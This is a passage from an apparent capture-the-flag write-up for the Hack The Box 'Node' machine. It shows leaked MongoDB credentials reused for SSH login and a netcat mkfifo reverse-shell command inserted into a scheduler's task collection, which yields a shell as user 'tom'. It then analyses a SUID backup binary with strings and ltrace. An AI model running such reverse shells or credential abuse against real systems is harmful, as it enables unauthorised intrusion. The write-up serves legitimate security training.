const url         <span class="o">=</span> <span class="s1">'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace'</span><span class="p">;</span>
const backup_key  <span class="o">=</span> <span class="s1">'45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474'</span><span class="p">;</span>
...
</pre></table></code></div></div><p>I then used the credentials on the <code class="language-plaintext highlighter-rouge">ssh</code> service and it logs us in!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh mark@node.htb             
The authenticity of host <span class="s1">'node.htb (10.10.10.58)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:I0Y7EMtrkyc9Z/92jdhXQen2Y8Lar/oqcDNLHn28Hbs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>node.htb,10.10.10.58<span class="s1">' (ECDSA) to the list of known hosts.
mark@node.htb'</span>s password: 5AYRft73VtFpc84k
mark@node:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mark<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mark<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>mark<span class="o">)</span>
</pre></table></code></div></div><p>Unfortunately, there was no user flag in <code class="language-plaintext highlighter-rouge">mark</code>’s home directory.</p><p>Moving on, when checking the running processes, I saw another <code class="language-plaintext highlighter-rouge">node</code> process running.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ps aux
tom       1219  0.0  5.7 1008568 43444 ?       Ssl  10:14   0:02 /usr/bin/node /var/scheduler/app.js
...
tom       1224  0.0  7.8 1031336 59376 ?       Ssl  10:14   0:03 /usr/bin/node /var/www/myplace/app.js
</pre></table></code></div></div><p>The other <code class="language-plaintext highlighter-rouge">node</code> process was running <code class="language-plaintext highlighter-rouge">/var/scheduler/app.js</code> so lets check it out.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="nx">mark</span><span class="p">@</span><span class="nd">node</span><span class="p">:</span><span class="o">~</span><span class="nx">$</span> <span class="nx">cat</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/scheduler/</span><span class="nx">app</span><span class="p">.</span><span class="nx">js</span>
<span class="kd">const</span> <span class="nx">exec</span>        <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nx">exec</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">MongoClient</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mongodb</span><span class="dl">'</span><span class="p">).</span><span class="nx">MongoClient</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">ObjectID</span>    <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mongodb</span><span class="dl">'</span><span class="p">).</span><span class="nx">ObjectID</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">url</span>         <span class="o">=</span> <span class="dl">'</span><span class="s1">mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler</span><span class="dl">'</span><span class="p">;</span>

<span class="nx">MongoClient</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">db</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">error</span> <span class="o">||</span> <span class="o">!</span><span class="nx">db</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">[!] Failed to connect to mongodb</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nx">db</span><span class="p">.</span><span class="nx">collection</span><span class="p">(</span><span class="dl">'</span><span class="s1">tasks</span><span class="dl">'</span><span class="p">).</span><span class="nx">find</span><span class="p">().</span><span class="nx">toArray</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">docs</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">error</span> <span class="o">&amp;&amp;</span> <span class="nx">docs</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">docs</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">doc</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nx">doc</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Executing task </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">doc</span><span class="p">.</span><span class="nx">_id</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">...</span><span class="dl">'</span><span class="p">);</span>
            <span class="nx">exec</span><span class="p">(</span><span class="nx">doc</span><span class="p">.</span><span class="nx">cmd</span><span class="p">);</span>
            <span class="nx">db</span><span class="p">.</span><span class="nx">collection</span><span class="p">(</span><span class="dl">'</span><span class="s1">tasks</span><span class="dl">'</span><span class="p">).</span><span class="nx">deleteOne</span><span class="p">({</span> <span class="na">_id</span><span class="p">:</span> <span class="k">new</span> <span class="nx">ObjectID</span><span class="p">(</span><span class="nx">doc</span><span class="p">.</span><span class="nx">_id</span><span class="p">)</span> <span class="p">});</span>
          <span class="p">}</span>
        <span class="p">});</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Something went wrong: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">error</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">});</span>
  <span class="p">},</span> <span class="mi">30000</span><span class="p">);</span>

<span class="p">});</span>
</pre></table></code></div></div><p>Judging from the code, at every 30s, it will query for all the documents in the <code class="language-plaintext highlighter-rouge">tasks</code> collection and execute the contents of the <code class="language-plaintext highlighter-rouge">cmd</code> property of each document found as a <code class="language-plaintext highlighter-rouge">bash</code> command and then proceed to delete the documents.</p><h1 id="exploitation-1">Exploitation (1)</h1><p>Now, we just need to access the <code class="language-plaintext highlighter-rouge">MongoDB</code> directly and insert a document containing a command which will establish a reverse shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>mongo localhost:27017/scheduler <span class="nt">-u</span> mark <span class="nt">-p</span> 5AYRft73VtFpc84k
MongoDB shell version: 3.2.16
connecting to: localhost:27017/scheduler
<span class="o">&gt;</span> db.tasks.insertOne<span class="o">({</span><span class="s2">"cmd"</span>:<span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XX.XX 1337 &gt;/tmp/f"</span><span class="o">})</span>
<span class="o">{</span>
        <span class="s2">"acknowledged"</span> : <span class="nb">true</span>,
        <span class="s2">"insertedId"</span> : ObjectId<span class="o">(</span><span class="s2">"6001919a9b6e0212d49e4b24"</span><span class="o">)</span>
<span class="o">}</span>
</pre></table></code></div></div><p>And then we setup our <code class="language-plaintext highlighter-rouge">nc</code> listener.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc lvnp 1337
listening on <span class="o">[</span>any] 1337 ...
</pre></table></code></div></div><p>After a while , we will get a shell as <code class="language-plaintext highlighter-rouge">tom</code>!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lvnp</span> 1337                                                                                                      
listening on <span class="o">[</span>any] 1337 ...
connect to <span class="o">[</span>10.10.XX.XX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.58] 43648
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
python -c "import pty; pty.spawn('</span>/bin/bash<span class="s1">')"
To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
See "man sudo_root" for details.

tom@node:/$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
</span></pre></table></code></div></div><h1 id="usertxt">user.txt</h1><p>The user flag is in <code class="language-plaintext highlighter-rouge">tom</code>’s home directory.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span><span class="nb">cat</span> /home/tom/user.txt
e115XXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>When we check for files that have the <code class="language-plaintext highlighter-rouge">SUID</code> bit set,</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span>find <span class="sb">`</span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null<span class="sb">`</span> <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
...
<span class="nt">-rwsr-xr--</span> 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
</pre></table></code></div></div><p>We see that there a program called <code class="language-plaintext highlighter-rouge">/usr/local/bin/backup</code> whose group owner is <code class="language-plaintext highlighter-rouge">admin</code>, which <code class="language-plaintext highlighter-rouge">tom</code> is in! That means if we execute this program, we will be running as the owner, or in this case is <code class="language-plaintext highlighter-rouge">root</code>.</p><p>Weirdly enough, running it doesn’t return any outputs.</p><p>Going back to the <code class="language-plaintext highlighter-rouge">app.js</code> we found in <code class="language-plaintext highlighter-rouge">/var/www/myplace</code>, we see that this program is being used.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="p">...</span>
<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/admin/backup</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">is_admin</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="dl">'</span><span class="s1">/usr/local/bin/backup</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">-q</span><span class="dl">'</span><span class="p">,</span> <span class="nx">backup_key</span><span class="p">,</span> <span class="nx">__dirname</span> <span class="p">]);</span>
      <span class="kd">var</span> <span class="nx">backup</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>

      <span class="nx">proc</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">exit</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">exitCode</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text/plain</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Disposition</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">attachment; filename=myplace.backup</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">backup</span><span class="p">);</span>
      <span class="p">});</span>
<span class="p">...</span>
</pre></table></code></div></div><p>It seem to take in 3 parts, the <code class="language-plaintext highlighter-rouge">-q</code> option, a <code class="language-plaintext highlighter-rouge">backup_key</code> and a directory name. We already got 1 <code class="language-plaintext highlighter-rouge">backup_key</code> we can use, which is from <code class="language-plaintext highlighter-rouge">/var/www/myplace/app.js</code>. Lets create a directory, put a fake file and test it out.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span><span class="nb">mkdir</span> /tmp/test
tom@node:/<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"hello world"</span> <span class="o">&gt;</span> /tmp/test/test.txt
tom@node:/<span class="nv">$ </span>/usr/local/bin/backup <span class="nt">-q</span> 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/test
UEsDBAoAAAAAAO1rL1IAAAAAAAAAAAAAAAAJABwAdG1wL3Rlc3QvVVQJAAMumQFgNZkBYHV4CwABBOgDAAAE6AMAAFBLAwQKAAkAAADtay9SLTsIrxgAAAAMAAAAEQAcAHRtcC90ZXN0L3Rlc3QudHh0VVQJAAMumQFgLpkBYHV4CwABBOgDAAAE6AMAAMZi5h0ojRxdCstFtxM/FIxJLl09pqn/Z1BLBwgtOwivGAAAAAwAAABQSwECHgMKAAAAAADtay9SAAAAAAAAAAAAAAAACQAYAAAAAAAAABAA7UEAAAAAdG1wL3Rlc3QvVVQFAAMumQFgdXgLAAEE6AMAAAToAwAAUEsBAh4DCgAJAAAA7WsvUi07CK8YAAAADAAAABEAGAAAAAAAAQAAAKSBQwAAAHRtcC90ZXN0L3Rlc3QudHh0VVQFAAMumQFgdXgLAAEE6AMAAAToAwAAUEsFBgAAAAACAAIApgAAALYAAAAAAA<span class="o">==</span>
</pre></table></code></div></div><p>The output was a <code class="language-plaintext highlighter-rouge">base64</code> string. If we follow what we did for the <code class="language-plaintext highlighter-rouge">myplace.backup</code>, we will get back the original file!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"UEsDBAoAAAAAAO1rL1IAAAAAAAAAAAAAAAAJABwAdG1wL3Rlc3QvVVQJAAMumQFgNZkBYHV4CwABBOgDAAAE6AMAAFBLAwQKAAkAAADtay9SLTsIrxgAAAAMAAAAEQAcAHRtcC90ZXN0L3Rlc3QudHh0VVQJAAMumQFgLpkBYHV4CwABBOgDAAAE6AMAAMZi5h0ojRxdCstFtxM/FIxJLl09pqn/Z1BLBwgtOwivGAAAAAwAAABQSwECHgMKAAAAAADtay9SAAAAAAAAAAAAAAAACQAYAAAAAAAAABAA7UEAAAAAdG1wL3Rlc3QvVVQFAAMumQFgdXgLAAEE6AMAAAToAwAAUEsBAh4DCgAJAAAA7WsvUi07CK8YAAAADAAAABEAGAAAAAAAAQAAAKSBQwAAAHRtcC90ZXN0L3Rlc3QudHh0VVQFAAMumQFgdXgLAAEE6AMAAAToAwAAUEsFBgAAAAACAAIApgAAALYAAAAAAA=="</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> output.zip
<span class="nv">$ </span>unzip output.zip
Archive:  output.zip
   creating: tmp/test/
<span class="o">[</span>output.zip] tmp/test/test.txt password: 
 extracting: tmp/test/test.txt 
<span class="nv">$ </span>tmp/test/test.txt
hello world
</pre></table></code></div></div><p>This is interesting, lets try backing up the <code class="language-plaintext highlighter-rouge">/root</code> directory, which will contain the <code class="language-plaintext highlighter-rouge">root</code> flag.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span>/usr/local/bin/backup <span class="nt">-q</span> 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root
<span class="o">[</span>+] Finished! Encoded backup is below:
                                                                                                                                                             
UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA<span class="o">==</span>
</pre></table></code></div></div><p>However, decoding it and unzipping will give the ASCII art of a troll face. Trying with <code class="language-plaintext highlighter-rouge">/etc</code> which contains the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file also didn’t work. If we run <code class="language-plaintext highlighter-rouge">strings</code>, we start seeing something.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span>strings /usr/local/bin/backup
...
Could not open file                                                                                                                                          
Validated access token                                                                                                                                       
Ah-ah-ah! You didn<span class="s1">'t say the magic word!                                                                                                                     
Finished! Encoded backup is below:                                                                                                                           
UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==                                              
/root                                                                                                                                                        
/etc                                                                                                                                                         
/tmp/.backup_%i                                                                                                                                              
/usr/bin/zip -r -P magicword %s %s &gt; /dev/null                                                                                                               
/usr/bin/base64 -w0 %s                                                                                                                                       
The target path doesn'</span>t exist 
...
</pre></table></code></div></div><p>It seems that <code class="language-plaintext highlighter-rouge">/root</code> and <code class="language-plaintext highlighter-rouge">/etc</code> are listed here. Perhaps this is a blacklist? Also the <code class="language-plaintext highlighter-rouge">base64</code> string above will return a ASCII art of a troll face as well. Lets see what functions calls are being made during execution.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span>ltrace <span class="nt">-s</span> 200 /usr/local/bin/backup <span class="nt">-q</span> 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/test
...
strcat<span class="o">(</span><span class="s2">"/e"</span>, <span class="s2">"tc"</span><span class="o">)</span>                               <span class="o">=</span> <span class="s2">"/etc"</span>                                                                                                    
strcat<span class="o">(</span><span class="s2">"/etc"</span>, <span class="s2">"/m"</span><span class="o">)</span>                             <span class="o">=</span> <span class="s2">"/etc/m"</span>                                                                                                  
strcat<span class="o">(</span><span class="s2">"/etc/m"</span>, <span class="s2">"yp"</span><span class="o">)</span>                           <span class="o">=</span> <span class="s2">"/etc/myp"</span>                                                                                                
strcat<span class="o">(</span><span class="s2">"/etc/myp"</span>, <span class="s2">"la"</span><span class="o">)</span>                         <span class="o">=</span> <span class="s2">"/etc/mypla"</span>                                                                                              
strcat<span class="o">(</span><span class="s2">"/etc/mypla"</span>, <span class="s2">"ce"</span><span class="o">)</span>                       <span class="o">=</span> <span class="s2">"/etc/myplace"</span>                                                                                            
strcat<span class="o">(</span><span class="s2">"/etc/myplace"</span>, <span class="s2">"/k"</span><span class="o">)</span>                     <span class="o">=</span> <span class="s2">"/etc/myplace/k"</span>                                                                                          
strcat<span class="o">(</span><span class="s2">"/etc/myplace/k"</span>, <span class="s2">"ey"</span><span class="o">)</span>                   <span class="o">=</span> <span class="s2">"/etc/myplace/key"</span>                                                                                        
strcat<span class="o">(</span><span class="s2">"/etc/myplace/key"</span>, <span class="s2">"s"</span><span class="o">)</span>                  <span class="o">=</span> <span class="s2">"/etc/myplace/keys"</span>                                                                                       
fopen<span class="o">(</span><span class="s2">"/etc/myplace/keys"</span>, <span class="s2">"r"</span><span class="o">)</span>                  <span class="o">=</span> 0x9392008                                                                                                 
fgets<span class="o">(</span><span class="s2">"a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508</span><span class="se">\n</span><span class="s2">"</span>, 1000, 0x9392008<span class="o">)</span> <span class="o">=</span> 0xffdc6f8f                                                    
strcspn<span class="o">(</span><span class="s2">"a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508</span><span class="se">\n</span><span class="s2">"</span>, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">=</span> 64                                                                     
strcmp<span class="o">(</span><span class="s2">"45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474"</span>, <span class="s2">"a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508"</span><span class="o">)</span> <span class="o">=</span> <span class="nt">-1</span>          
fgets<span class="o">(</span><span class="s2">"45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474</span><span class="se">\n</span><span class="s2">"</span>, 1000, 0x9392008<span class="o">)</span> <span class="o">=</span> 0xffdc6f8f                                                    
strcspn<span class="o">(</span><span class="s2">"45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474</span><span class="se">\n</span><span class="s2">"</span>, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">=</span> 64                                                                     
strcmp<span class="o">(</span><span class="s2">"45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474"</span>, <span class="s2">"45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474"</span><span class="o">)</span> <span class="o">=</span> 0           
fgets<span class="o">(</span><span class="s2">"3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110</span><span class="se">\n</span><span class="s2">"</span>, 1000, 0x9392008<span class="o">)</span> <span class="o">=</span> 0xffdc6f8f                                                    
strcspn<span class="o">(</span><span class="s2">"3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110</span><span class="se">\n</span><span class="s2">"</span>, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">=</span> 64                                                                     
strcmp<span class="o">(</span><span class="s2">"45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474"</span>, <span class="s2">"3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110"</span><span class="o">)</span> <span class="o">=</span> 1
